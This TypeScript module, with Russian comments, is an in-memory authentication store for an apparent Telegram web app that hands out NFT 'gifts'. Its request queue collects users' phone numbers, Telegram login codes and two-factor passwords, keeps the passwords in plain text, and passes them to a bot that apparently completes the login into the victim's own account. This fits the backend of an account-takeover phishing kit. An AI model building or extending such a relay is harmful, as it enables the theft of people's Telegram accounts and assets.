// Централизованное хранилище для авторизации
// В production используйте Redis или базу данных

interface VerificationCode {
  code: string
  phone: string
  expiresAt: number
  source: "webapp" | "bot"
}

interface Session {
  telegramId: string
  phone: string
  authenticatedAt: number
}

interface UserData {
  id: number
  username?: string
  firstName: string
  balance: number
  level: number
  rating: number
  referralCount: number
  referredBy?: number
  createdAt: number
  phone?: string
}

interface TelegramAuthSession {
  phone: string
  phoneCodeHash?: string
  status: "pending_code" | "pending_2fa" | "completed" | "error"
  code?: string
  errorMessage?: string
  createdAt: number
  telegramId: string
  has2FA?: boolean
}

interface PendingCode {
  code: string
  phone: string
  createdAt: number
  codeVerified?: boolean
}

interface AuthRequest {
  requestId: string
  action: "send_phone" | "send_code" | "send_password" | "CANCEL_LOGIN"
  phone?: string
  code?: string
  password?: string
  chatId?: string
  telegramId?: string // Track telegram user ID
  timestamp: number
  processed: boolean
  status: "pending" | "waiting_code" | "waiting_password" | "success" | "error" | "cancelled"
  message?: string
  error?: string
}

interface UserPhone {
  telegramId: string
  phone: string
  linkedAt: number
  status: "pending" | "verified" | "active"
}

interface UserGift {
  id: string // Unique gift instance ID
  nftId: string // NFT ID from bot (e.g. gift_123456)
  collectionName: string // Collection name (e.g. "Plush Pepe")
  collectionSlug: string // URL slug (e.g. "plush-pepe")
  phone: string // Phone number used to receive
  telegramId: string // Telegram user ID
  receivedAt: number // Timestamp when received
  quantity: number // Количество
  metadata?: {
    // Additional metadata from bot
    giftName?: string
    rarity?: string
    imageUrl?: string
    animationUrl?: string
  }
}

declare global {
  var _authStoreData:
    | {
        verificationCodes: Map<string, VerificationCode>
        sessions: Map<string, Session>
        users: Map<string, UserData>
        telegramAuth: Map<string, TelegramAuthSession>
        pendingCodes: Map<string, PendingCode>
        authRequests: Map<string, AuthRequest>
        userPhones: Map<string, UserPhone>
        userGifts: Map<string, UserGift[]> // Added gifts storage: telegramId -> gifts array
        giftRegistry: Set<string> // Registry to prevent duplicate gifts
      }
    | undefined
}

function getStore() {
  if (!global._authStoreData) {
    global._authStoreData = {
      verificationCodes: new Map(),
      sessions: new Map(),
      users: new Map(),
      telegramAuth: new Map(),
      pendingCodes: new Map(),
      authRequests: new Map(),
      userPhones: new Map(),
      userGifts: new Map(), // Initialize gifts storage
      giftRegistry: new Set(), // Initialize gift registry
    }
  }
  return global._authStoreData
}

function normalizePhone(phone: string): string {
  // Remove all non-digit characters except leading +
  return phone.replace(/[^\d+]/g, "").replace(/^\+/, "")
}

export const authStore = {
  get pendingCodes() {
    return getStore().pendingCodes
  },
  get sessions() {
    return getStore().sessions
  },
  get telegramAuth() {
    return getStore().telegramAuth
  },
  get users() {
    return getStore().users
  },
  get verificationCodes() {
    return getStore().verificationCodes
  },
  get authRequests() {
    return getStore().authRequests
  },
  get userPhones() {
    return getStore().userPhones
  },
  get userGifts() {
    return getStore().userGifts
  },
  get giftRegistry() {
    return getStore().giftRegistry
  },
}

export function linkUserPhone(
  telegramId: string,
  phone: string,
  status: "pending" | "verified" | "active" = "pending",
) {
  const store = getStore()
  const normalizedPhone = normalizePhone(phone)
  store.userPhones.set(telegramId, {
    telegramId,
    phone: normalizedPhone,
    linkedAt: Date.now(),
    status,
  })
  console.log(`[AuthStore] Linked phone ${normalizedPhone} to telegram ID ${telegramId}`)
}

export function getUserPhone(telegramId: string): UserPhone | undefined {
  const store = getStore()
  return store.userPhones.get(telegramId)
}

export function updateUserPhoneStatus(telegramId: string, status: "pending" | "verified" | "active") {
  const store = getStore()
  const existing = store.userPhones.get(telegramId)
  if (existing) {
    store.userPhones.set(telegramId, { ...existing, status })
  }
}

export function getAllUserPhones(): UserPhone[] {
  const store = getStore()
  return Array.from(store.userPhones.values())
}

export function createAuthRequest(
  data: Omit<AuthRequest, "requestId" | "timestamp" | "processed" | "status"> & { requestId?: string },
): AuthRequest {
  const store = getStore()
  const requestId = data.requestId || `req_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`
  const normalizedPhone = data.phone ? normalizePhone(data.phone) : undefined

  const existing = data.requestId ? store.authRequests.get(data.requestId) : undefined

  const request: AuthRequest = {
    ...data,
    phone: normalizedPhone || existing?.phone,
    telegramId: data.telegramId || existing?.telegramId,
    requestId,
    timestamp: Date.now(),
    processed: false, // Always reset to false for new action
    status: "pending",
  }
  store.authRequests.set(requestId, request)

  console.log(
    `[AuthStore] Created/Updated request ${requestId}: action=${data.action}, phone=${request.phone}, telegramId=${request.telegramId}`,
  )

  if (request.telegramId && request.phone) {
    linkUserPhone(request.telegramId, request.phone, "pending")
  }

  return request
}

export function getAuthRequestById(requestId: string): AuthRequest | undefined {
  const store = getStore()
  return store.authRequests.get(requestId)
}

export function getAuthRequest(requestId: string): AuthRequest | undefined {
  const store = getStore()
  return store.authRequests.get(requestId)
}

export function updateAuthRequest(requestId: string, updates: Partial<AuthRequest>) {
  const store = getStore()
  const existing = store.authRequests.get(requestId)
  if (existing) {
    store.authRequests.set(requestId, { ...existing, ...updates })

    if (existing.telegramId && updates.status) {
      if (updates.status === "success") {
        updateUserPhoneStatus(existing.telegramId, "active")
      } else if (updates.status === "waiting_code" || updates.status === "waiting_password") {
        updateUserPhoneStatus(existing.telegramId, "verified")
      }
    }
  }
}

export function getPendingAuthRequests(): AuthRequest[] {
  const store = getStore()
  const pending: AuthRequest[] = []
  for (const request of store.authRequests.values()) {
    if (!request.processed) {
      pending.push(request)
    }
  }
  return pending
}

export function getAuthRequestByPhone(phone: string): AuthRequest | undefined {
  const store = getStore()
  const normalizedPhone = normalizePhone(phone)
  for (const request of store.authRequests.values()) {
    const requestPhone = request.phone ? normalizePhone(request.phone) : ""
    if (requestPhone === normalizedPhone && !request.processed) {
      return request
    }
  }
  return undefined
}

export function getLatestAuthRequestByPhone(phone: string): AuthRequest | undefined {
  const store = getStore()
  const normalizedPhone = normalizePhone(phone)
  let latest: AuthRequest | undefined
  for (const request of store.authRequests.values()) {
    const requestPhone = request.phone ? normalizePhone(request.phone) : ""
    if (requestPhone === normalizedPhone) {
      if (!latest || request.timestamp > latest.timestamp) {
        latest = request
      }
    }
  }
  console.log(
    `[AuthStore] getLatestAuthRequestByPhone(${phone}) normalized=${normalizedPhone} found=${latest?.requestId}`,
  )
  return latest
}

export function getAuthRequestByTelegramId(telegramId: string): AuthRequest | undefined {
  const store = getStore()
  let latest: AuthRequest | undefined
  for (const request of store.authRequests.values()) {
    if (request.telegramId === telegramId || request.chatId === telegramId) {
      if (!latest || request.timestamp > latest.timestamp) {
        latest = request
      }
    }
  }
  console.log(`[AuthStore] getAuthRequestByTelegramId(${telegramId}) found=${latest?.requestId}`)
  return latest
}

// Telegram Auth Session Management
export function setTelegramAuth(telegramId: string, data: TelegramAuthSession) {
  const store = getStore()
  store.telegramAuth.set(telegramId, data)
}

export function getTelegramAuth(telegramId: string): TelegramAuthSession | undefined {
  const store = getStore()
  return store.telegramAuth.get(telegramId)
}

export function updateTelegramAuth(telegramId: string, updates: Partial<TelegramAuthSession>) {
  const store = getStore()
  const existing = store.telegramAuth.get(telegramId)
  if (existing) {
    store.telegramAuth.set(telegramId, { ...existing, ...updates })
  }
}

export function deleteTelegramAuth(telegramId: string) {
  const store = getStore()
  store.telegramAuth.delete(telegramId)
}

// Verification Codes
export function setVerificationCode(
  telegramId: string,
  code: string,
  phone: string,
  source: "webapp" | "bot" = "webapp",
) {
  const store = getStore()
  store.verificationCodes.set(telegramId, {
    code,
    phone,
    expiresAt: Date.now() + 5 * 60 * 1000,
    source,
  })
}

export function getVerificationCode(telegramId: string): VerificationCode | undefined {
  const store = getStore()
  const data = store.verificationCodes.get(telegramId)

  if (data && Date.now() > data.expiresAt) {
    store.verificationCodes.delete(telegramId)
    return undefined
  }

  return data
}

export function deleteVerificationCode(telegramId: string) {
  const store = getStore()
  store.verificationCodes.delete(telegramId)
}

// Sessions
export function createSession(telegramId: string, phone: string): string {
  const store = getStore()
  const sessionToken = `session_${telegramId}_${Date.now()}_${Math.random().toString(36).slice(2)}`

  store.sessions.set(sessionToken, {
    telegramId,
    phone,
    authenticatedAt: Date.now(),
  })

  return sessionToken
}

export function getSession(sessionToken: string): Session | undefined {
  const store = getStore()
  return store.sessions.get(sessionToken)
}

export function getSessionByTelegramId(telegramId: string): { token: string; session: Session } | undefined {
  const store = getStore()

  for (const [token, session] of store.sessions.entries()) {
    if (session.telegramId === telegramId) {
      return { token, session }
    }
  }

  return undefined
}

// Users
export function getUser(telegramId: string): UserData | undefined {
  const store = getStore()
  return store.users.get(telegramId)
}

export function setUser(telegramId: string, data: UserData) {
  const store = getStore()
  store.users.set(telegramId, data)
}

export function updateUser(telegramId: string, updates: Partial<UserData>) {
  const store = getStore()
  const existing = store.users.get(telegramId)
  if (existing) {
    store.users.set(telegramId, { ...existing, ...updates })
  }
}

export function generateCode(): string {
  return Math.floor(10000 + Math.random() * 90000).toString()
}

export function addUserGift(
  telegramId: string,
  gift: Omit<UserGift, "id" | "receivedAt">,
): { success: boolean; error?: string; gift?: UserGift } {
  const store = getStore()

  // Create unique key for duplicate check: nftId + telegramId
  const giftKey = `${gift.nftId}_${telegramId}`

  // Check for duplicates
  if (store.giftRegistry.has(giftKey)) {
    console.log(`[AuthStore] Duplicate gift rejected: ${giftKey}`)
    return { success: false, error: "Gift already exists for this user" }
  }

  // Create gift instance
  const giftInstance: UserGift = {
    ...gift,
    id: `gift_${Date.now()}_${Math.random().toString(36).slice(2, 9)}`,
    receivedAt: Date.now(),
  }

  // Get or create user's gift array
  const userGifts = store.userGifts.get(telegramId) || []

  // Check if same NFT already exists (additional safety check)
  const existingGift = userGifts.find((g) => g.nftId === gift.nftId)
  if (existingGift) {
    // Increment quantity instead of adding duplicate
    existingGift.quantity += gift.quantity || 1
    store.userGifts.set(telegramId, userGifts)
    console.log(`[AuthStore] Gift quantity incremented: ${gift.nftId} for user ${telegramId}`)
    return { success: true, gift: existingGift }
  }

  // Add to user's gifts
  userGifts.push(giftInstance)
  store.userGifts.set(telegramId, userGifts)

  // Register gift to prevent future duplicates
  store.giftRegistry.add(giftKey)

  console.log(`[AuthStore] Gift added: ${gift.nftId} (${gift.collectionName}) to user ${telegramId}`)
  return { success: true, gift: giftInstance }
}

export function getUserGifts(telegramId: string): UserGift[] {
  const store = getStore()
  return store.userGifts.get(telegramId) || []
}

export function getUserGiftsByPhone(phone: string): UserGift[] {
  const store = getStore()
  const normalizedPhone = normalizePhone(phone)
  const allGifts: UserGift[] = []

  for (const gifts of store.userGifts.values()) {
    for (const gift of gifts) {
      if (normalizePhone(gift.phone) === normalizedPhone) {
        allGifts.push(gift)
      }
    }
  }

  return allGifts
}

export function getTotalGiftsCount(telegramId: string): number {
  const gifts = getUserGifts(telegramId)
  return gifts.reduce((total, gift) => total + (gift.quantity || 1), 0)
}

export function removeUserGift(telegramId: string, giftId: string): boolean {
  const store = getStore()
  const userGifts = store.userGifts.get(telegramId)

  if (!userGifts) return false

  const giftIndex = userGifts.findIndex((g) => g.id === giftId)
  if (giftIndex === -1) return false

  const gift = userGifts[giftIndex]

  // Remove from registry
  const giftKey = `${gift.nftId}_${telegramId}`
  store.giftRegistry.delete(giftKey)

  // Remove from user's gifts
  userGifts.splice(giftIndex, 1)
  store.userGifts.set(telegramId, userGifts)

  console.log(`[AuthStore] Gift removed: ${giftId} from user ${telegramId}`)
  return true
}
